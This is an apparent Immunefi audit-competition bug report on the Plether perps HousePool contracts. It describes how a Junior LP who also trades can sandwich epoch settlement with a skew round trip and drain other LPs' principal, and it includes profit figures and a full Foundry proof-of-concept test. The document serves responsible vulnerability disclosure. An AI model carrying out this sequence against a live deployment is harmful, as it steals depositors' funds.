# \#100072 [SC-Critical] Junior NAV counts refundable open VPI as earned revenue, so an LP who also trades can sandwich `settleLpEpoch` with a skew round trip and steal the remaining Junior LPs' principal

**Submitted on Nov 16th 2026 at 07:26:18 UTC by @sh15h4nk for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100072
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When a position opens, its skew charge (VPI) is booked to the pool as revenue at once and lands in Junior principal at the next reconcile. VPI is a state potential, though, and the same position gets up to that amount back when it closes: the full amount by telescoping at unchanged depth, and exactly that amount (capped by the lifetime clamp) when depth has fallen. The Junior NAV that prices LP redemptions and deposits carries no liability for this refundable amount. A Junior LP that also trades can queue a redemption, open a max-skew position seconds before the epoch boundary, be redeemed at a NAV that includes the open VPI, and close right after settlement. The refund is paid from cash that now belongs only to the LPs who stayed or who entered at the same NAV. At release parameters, an attacker holding 25M of 30M Junior nets **+17,178 USDG** per cycle, and the remaining Junior LPs lose **−25,356 USDG (−0.51% of their principal)**. The attacker's capital is returned every cycle, and the cycle repeats every ~3 hours. No majority is needed: at a 50% share the attacker nets +3,952 per cycle, and the break-even share is ~40% with self-made skew and ~23% when stacking on organic skew.

## Vulnerability Details

**1. Open VPI becomes Junior principal immediately.** On an open, the whole trade cost except the protocol fee goes to the pool as `Revenue` / `CashArrived`:

```solidity
// CfdEngineSettlementSidecar.sol:454-462
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived);
```

`HousePool.recordClaimantInflow` adds it to `accountedAssets` (HousePool.sol:640-642). At the next `_reconcile`, after the time-based Senior coupon (paid out of Junior principal, HousePoolReconcilePlanLib.sol:57-60), revenue first restores any impaired Senior principal up to its high-water mark and the rest goes to Junior (`nextState.juniorPrincipal += remaining`, HousePoolWaterfallAccountingLib.sol:140-159). With Senior unimpaired, the whole open VPI lands in Junior.

**2. LP exit and entry are priced on that principal, with no liability for refundable VPI.** `_settleLpEpoch` reconciles first and then prices the Junior phase on the result (`juniorPhase.pricingPrincipal = juniorPrincipal`, HousePool.sol:835-841; deposits at :915-919). `buildReconcileSnapshot` (HousePoolAccountingLib.sol:60-78) counts physical assets, trader claims and the signed terminal price delta. Nothing in it reserves the positive VPI that open positions will take back.

**3. The close refunds the open VPI.** Close VPI is computed fresh at live depth (`pool.totalAssets()`, OrderRouterExecutionSidecar.sol:933, :953) as the difference of the potential `C(S) = k·S²/(2D)`. At unchanged depth, the skew-reducing close's rebate equals the open charge, because the curve telescopes (WHITEPAPER.md:850-857, :903-904). When the redemption has lowered depth, the raw rebate exceeds the open charge, and the lifetime clamp cuts it back to exactly the open charge:

```solidity
// CloseAccountingLib.sol:112-118
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The close execution fee is netted into the rebate (CfdEnginePlanLib.sol:1041-1061), and the net rebate is paid from free pool cash (CfdEnginePlanLib.sol:972-977, `IHousePool.payOut` at CfdEngineSettlementSidecar.sol:621-623). By then that cash belongs only to the LPs who did not redeem.

**4. Nothing blocks the sequence.**
- Admission rejects an open only when `postSkew > maxSkew` and the order does not reduce the imbalance (CfdEnginePlanLib.sol:473-479), so a skew-increasing open to exactly 40% of depth is accepted.
- `executeOrder` (OrderRouter.sol:233) and `settleLpEpoch` (OrderRouter.sol:475-479) are permissionless. There is no epoch-boundary gate on execution, and nothing links an account's position to its LP redemption: `requestRedeem` checks only the cooldown, unlocked shares, minimum size and allowance (TrancheVault.sol:606-631). None of these looks at positions, and the PoC uses separate LP and trader addresses anyway.
- Redemption requests for epoch B close 5 minutes before the boundary (TrancheVault.sol:39), so LPs who stay cannot join the exit after seeing the open. A pending Junior entrant could only cancel in the seconds between the open and B (TrancheVault.sol:851-859).
- Epoch B cannot settle before B: with open positions, settlement needs a Router-bound mark published in epoch B (HousePool.sol:808-818; SECURITY.md:430). An open executed before B is therefore always in the reconcile that prices the redemption, and the attacker commits the close only after it sees settlement.
- The redemption is limited only by free cash and the Senior ratio cap `juniorPrincipal − Senior/4` (HousePool.sol:1205-1217). The open VPI itself adds to free cash.

**Net effect.** Let `f` be the attacker's share of Junior, `V` the open VPI and `F` the 4 bps execution fee per leg.
- The trader leg pays `V` and gets `V` back. It pays `F_open` to the treasury; `F_close` is netted and stays in the pool.
- The LP leg exits with `f·V` of "revenue" that the close then hands back.
- Victim loss = `f·V − F_close`. Attacker gain = `f·V − F_open − F_close`.
- At release `k = 0.01`, a 0 → 40% skew gives `V = 5F`, so the attack pays for `f > 0.4`. Stacking 10% on 30% organic skew gives `V = 8.75F`, so it pays for `f > 0.23`. These thresholds do not depend on pool size.
- An exiting LP captures `f ×` **all** positive open VPI on the book, not just its own trade's. The attacker's trade only makes the capture deterministic and immediate.


## Impact Details

The loss is Junior LP principal held by HousePool, not unclaimed yield: the remaining LPs end below their value before the attacker's trade (−25,356 against +1,308 in the trade-only control), and a same-epoch entrant loses 26,654 of the principal it deposited. It moves to an unprivileged LP/trader through production entry points, deterministically and with no price movement.

Minimal PoC, release risk parameters, price 1.00, Senior 20M, attacker 25M and victim 5M Junior (USDG):

| Run | Attacker net | Pre-existing Junior (5M) | Entrant (25M) | Depth open → close |
|---|---|---|---|---|
| Attack | **+17,178** | **−25,356 (−0.51%)** | — | 50.00M → 25.01M |
| Attack, constant depth | **+17,172** | +1,298 | **−26,654** | 50.00M → 50.01M |
| Control: same round trip, no redemption | −16,032 (trader) | +1,308 | — | 50.00M → 50.04M |

Additional measurements from extended harnesses (A12_L1_Half / A12_L1_Ext, available on request; their baselines differ slightly from the minimal PoC, e.g. +17,254 vs +17,178 for the base case):
- **Lower share.** At a 50% share the attacker nets +3,952 and victims lose −12,089.
- **Stacking on organic skew.** At a 30% share, a 5M trade stacked on 15M organic skew nets the attacker +7,969 and costs victims −4,202. Of that, the attack trade adds ≈ +1.25k over a plain redemption (0.3 × 17,491 − 2 × 2,000). The plain redemption already captures 0.3 × the organic position's 22,499 open VPI from the remaining LPs, so an ordinary exit takes the same unmarked value.
- **Repeated cycles.** Three consecutive cycles 3h apart (re-deposit, 1h cooldown, re-redeem) at an 81% share (25M of 31M) net the attacker +49,122 and cost victims −74,873 (−74,331 net of the −542 no-trade control). The per-cycle loss stays flat at ~24.8k.
- **Entry side.** A skew-reducing open before a deposit activates nets the attacker +5,326 and costs pre-existing Junior −13,417.

**Scale and limits:**
- **Rate.** Victim loss ≈ f·0.0008·D − 0.00016·D per cycle at self-made max skew (≈ 0.05% of depth at f = 0.83; attacker gain ≈ 0.034%), with up to 8 cycles per weekday (3h minimum cycle: 1h epochs plus the 1h post-activation cooldown).
- **Total.** Cycles repeat without decay (victim loss −24,774 / −24,813 / −24,851 over three cycles). Each full exit can take Junior only down to the Senior ratio floor (max(Senior principal, HWM)/4 plus reserved Senior deposits/4 at 8000 bps, HousePoolSeniorCapacityLib.sol:64-90; HousePool.sol:1205-1217). Below that, the attacker must leave part of its stake in, so the per-cycle loss shrinks as victim principal shrinks, but it does not stop. New Junior entrants are themselves victims at entry.
- **Junior share.** No majority or voting power is needed: the break-even share is ~23% when stacking on organic skew and ~40% with self-made skew, independent of pool size. The share is ordinary LP capital, returned in full every cycle, so it is a capital requirement, not a cost.
- **Oracle confidence.** The PoC uses confidence 0. At release limits (10 bps max confidence × 2,500 bps multiplier, DEPLOYMENT.md:146-147; PletherOracle.sol:910), the adverse execution shift is at most 2.5 bps of notional per leg, and it goes to the pool (the open-leg shift is marked into Junior NAV at settlement, so the exiting attacker recovers f of it). Even charging the full 2 × 2.5 bps to the attacker, at that cap the 83% case nets ≥ +7,178 and the stacking case ≥ +5,469. 10 bps is the rejection cap, not a typical confidence.
- **Attacker risks.** Market exposure between open and close, and one trader-only round trip (~16k) if queue congestion delays the open past the boundary.


## References

- Open VPI to pool as revenue: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L462
- Revenue inflow accounting: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L640-L642
- Senior coupon before revenue: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L57-L60
- Revenue to Junior principal: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L140-L159
- Redemption and deposit pricing after reconcile: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L915-L919
- Permissionless `settleLpEpoch`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L475-L479
- Junior settlement capacity: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1205-L1217
- NAV snapshot without refundable-VPI liability: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L46-L78
- Live depth for close VPI: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L933 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L953
- Lifetime VPI clamp: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118
- Rebate from free cash and fee netting: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L972-L977 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1041-L1061
- Skew admission (strict `>`): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L473-L479
- Request cutoff and cooldown: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L38-L39; Junior deposit cancel window: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L851-L859
- Epoch settlement mark rule: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L808-L818
- Senior ratio floor: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolSeniorCapacityLib.sol#L64-L90
- Design text: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L1061-L1066, https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1044-L1048, https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L859-L863, https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L871-L872, https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1443, https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L850-L857, https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L887-L888


## Proof of Concept

## Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;
import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

contract VpiRefundNavPoC is BasePerpTest {

    address internal constant ATTACKER_LP = address(0xA11CE);
    address internal constant ATTACKER_TRADER = address(0xA11CE7);
    address internal constant VICTIM_LP = address(0xB0B);
    address internal constant SENIOR_LP = address(0x5E1);
    address internal constant NEWCOMER = address(0x4E3);
    address internal constant KEEPER = address(0xC0FFEE);

    uint256 internal constant ATTACKER_JUNIOR = 25_000_000e6;
    uint256 internal constant VICTIM_JUNIOR = 5_000_000e6;
    uint256 internal constant SENIOR = 20_000_000e6;
    uint256 internal constant TRADER_FUNDING = 300_000e6;
    uint256 internal constant SIZE = 20_000_000e18; // 20M notional = 40% of 50M depth
    uint256 internal constant PRICE = 1e8;

    uint256 private nonce;

    struct Result {
        int256 attackerNet; // LP redemption gain + trader P&L
        int256 victimDelta; // pre-existing 5M Junior LP
        int256 newcomerDelta; // same-epoch entrant (constant-depth case only)
        int256 traderDelta;
        uint256 depthAtOpen;
        uint256 depthAtClose;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        vm.warp(SETUP_TIMESTAMP + ((block.timestamp - SETUP_TIMESTAMP) / 1 weeks + 1) * 1 weeks); // Monday, live market
        _fundJunior(ATTACKER_LP, ATTACKER_JUNIOR);
        _fundJunior(VICTIM_LP, VICTIM_JUNIOR);
        _fundSenior(SENIOR_LP, SENIOR);
        vm.warp(vm.getBlockTimestamp() + 2 hours); // past the 1h deposit cooldown
        router.updateMarkPrice(_mockPythUpdateData(PRICE));
        _fundTrader(ATTACKER_TRADER, TRADER_FUNDING);
    }

    function _scenario(
        bool redeem,
        bool newcomer
    ) internal returns (Result memory r) {
        uint256 victimShares = juniorVault.balanceOf(VICTIM_LP);
        uint256 victimBefore = juniorVault.convertToAssets(victimShares);
        uint256 lpShares = juniorVault.balanceOf(ATTACKER_LP);
        uint256 lpBefore = juniorVault.convertToAssets(lpShares);
        uint256 boundary = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;

        // 1. B-30min (before the B-5min cutoff): attacker LP requests a full redemption; optional unrelated deposit.
        vm.warp(boundary - 30 minutes);
        uint256 reqId;
        uint256 depId;
        if (redeem) {
            vm.prank(ATTACKER_LP);
            reqId = juniorVault.requestRedeem(lpShares, ATTACKER_LP, ATTACKER_LP);
        }
        if (newcomer) {
            settlementToken.mint(NEWCOMER, ATTACKER_JUNIOR);
            vm.startPrank(NEWCOMER);
            settlementToken.approve(address(juniorVault), ATTACKER_JUNIOR);
            depId = juniorVault.requestDeposit(ATTACKER_JUNIOR, NEWCOMER, NEWCOMER);
            vm.stopPrank();
        }

        // 2. B-22s: attacker trader opens a 40%-skew SHORT. Its VPI (~40k) goes to the pool as revenue.
        vm.warp(boundary - 22);
        r.depthAtOpen = pool.totalAssets();
        OrderV3Types.OrderRequest memory open_ = _request(SIZE, false);
        open_.marginDelta = 150_000e6;
        _commitAndExecute(open_);

        // 3. B: anyone settles the epoch. Junior is priced on principal that now includes the open VPI.
        vm.warp(boundary);
        uint256 lpPaid;
        uint256 newcomerShares;
        if (redeem || newcomer) {
            bytes[] memory settleData = _mockPythUpdateData(PRICE); // post-boundary basket
            vm.prank(KEEPER);
            router.settleLpEpoch(settleData);
        }
        if (redeem) {
            vm.prank(ATTACKER_LP);
            lpPaid = juniorVault.claimRedeem(reqId, lpShares, ATTACKER_LP, ATTACKER_LP);
        }
        if (newcomer) {
            vm.prank(NEWCOMER);
            newcomerShares = juniorVault.claimDeposit(depId, ATTACKER_JUNIOR, NEWCOMER, NEWCOMER);
        }

        // 4. Next block: attacker trader closes. The skew-reducing close refunds the open VPI from pool cash.
        r.depthAtClose = pool.totalAssets();
        _commitAndExecute(_request(SIZE, true));

        r.traderDelta = int256(clearinghouse.balanceAssets(ATTACKER_TRADER)) - int256(TRADER_FUNDING);
        r.attackerNet = (redeem ? int256(lpPaid) - int256(lpBefore) : int256(0)) + r.traderDelta;
        r.victimDelta = int256(juniorVault.convertToAssets(victimShares)) - int256(victimBefore);
        if (newcomer) r.newcomerDelta = int256(juniorVault.convertToAssets(newcomerShares)) - int256(ATTACKER_JUNIOR);

        console2.log("depth at open / close:", r.depthAtOpen, r.depthAtClose);
        console2.log("attacker net (LP gain + trader P&L):", r.attackerNet);
        console2.log("trader P&L:", r.traderDelta);
        console2.log("pre-existing victim LP delta:", r.victimDelta);
        console2.log("newcomer LP delta:", r.newcomerDelta);
    }

    /// Attacker exits at a NAV that includes the open VPI; the remaining LPs fund the refund.
    function test_Attack() public {
        Result memory r = _scenario(true, false);
        assertGt(r.attackerNet, 15_000e6, "attacker profits > 15k USDG");
        assertLt(r.victimDelta, -20_000e6, "remaining Junior LPs lose > 20k USDG");
    }

    /// Same attack with depth held constant by an unrelated deposit: no depth manipulation, the clamp does not bind,
    /// and the theft is unchanged. The entrant pays the inflated NAV.
    function test_Attack_ConstantDepth() public {
        Result memory r = _scenario(true, true);
        assertApproxEqRel(r.depthAtClose, r.depthAtOpen, 0.001e18, "depth unchanged (within 0.1%)");
        assertGt(r.attackerNet, 15_000e6, "attacker profits > 15k USDG at constant depth");
        assertLt(r.victimDelta + r.newcomerDelta, -20_000e6, "LP cohort loses > 20k USDG");
    }

    /// Control: the identical round trip without the redemption harms no LP; the trader alone pays.
    function test_Control_TradeOnly() public {
        Result memory r = _scenario(false, false);
        assertGe(r.victimDelta, 0, "LPs not harmed");
        assertLt(r.traderDelta, -15_000e6, "round trip costs the trader");
    }

    function _commitAndExecute(
        OrderV3Types.OrderRequest memory request
    ) private {
        vm.prank(ATTACKER_TRADER);
        uint64 id = router.commitOrder(request);
        bytes[] memory update = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory res = router.executeOrder(id, update);
        assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _request(
        uint256 size,
        bool isClose
    ) private returns (OrderV3Types.OrderRequest memory q) {
        q.clientOrderId = keccak256(abi.encode("vpi-nav", ++nonce));
        q.side = CfdTypes.Side.SHORT;
        q.sizeDelta = size;
        q.isClose = isClose;
        q.targetPrice = isClose ? 1 : type(uint256).max; // SHORT: no slippage bound in either direction
        q.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

}

```
